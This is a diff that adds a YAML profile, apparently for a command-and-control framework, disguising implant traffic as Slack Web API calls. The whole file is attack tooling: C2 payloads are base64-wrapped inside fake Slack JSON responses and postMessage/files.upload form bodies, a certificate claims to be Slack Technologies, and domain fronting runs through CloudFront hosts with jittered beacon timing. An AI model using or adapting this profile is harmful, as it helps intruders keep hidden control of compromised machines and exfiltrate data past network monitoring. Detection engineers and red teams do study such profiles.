@@ -1,0 +1,65 @@
+# slack-api.yaml — Slack Web API masquerade
+# C2 traffic blends with legitimate Slack Bot API calls.
+# GET requests poll for "messages"; POST requests "send" messages.
+
+name: slack-api
+description: Masquerade as Slack API traffic
+
+http-get:
+  uri:
+    - /api/conversations.history
+    - /api/conversations.replies
+    - /api/users.list
+    - /api/team.info
+    - /api/channels.info
+  headers:
+    Host: slack.com
+    Authorization: "Bearer xoxb-{{AGENT_ID}}-{{RAND}}"
+    Content-Type: application/json; charset=utf-8
+    Accept: application/json
+    X-Slack-No-Retry: "1"
+    X-Slack-Req-Id: "{{RAND}}"
+  body:
+    # Wrap encrypted payload inside a realistic Slack JSON response
+    prepend: '{"ok":true,"messages":['
+    append: '],"has_more":false,"response_metadata":{"next_cursor":""}}'
+    transform: base64
+
+http-post:
+  uri:
+    - /api/chat.postMessage
+    - /api/chat.update
+    - /api/files.upload
+  headers:
+    Host: slack.com
+    Authorization: "Bearer xoxb-{{AGENT_ID}}-{{RAND}}"
+    Content-Type: application/x-www-form-urlencoded
+    Accept: application/json
+    X-Slack-No-Retry: "1"
+    X-Slack-Req-Id: "{{RAND}}"
+  body:
+    # Embed payload as URL-safe base64 inside a form-encoded body
+    prepend: "channel=C0GENERAL&text="
+    append: "&as_user=true&unfurl_links=false"
+    transform: base64url
+
+https-certificate:
+  CN: "*.slack.com"
+  O: "Slack Technologies, LLC"
+
+host-rotation:
+  strategy: round-robin
+  hosts:
+    - d1234.cloudfront.net
+    - d5678.cloudfront.net
+  domain-fronting:
+    sni: d1234.cloudfront.net
+    host: slack.com
+
+sleep:
+  default: 60
+  jitter: 25
+
+user-agent:
+  - "Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)"
+  - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
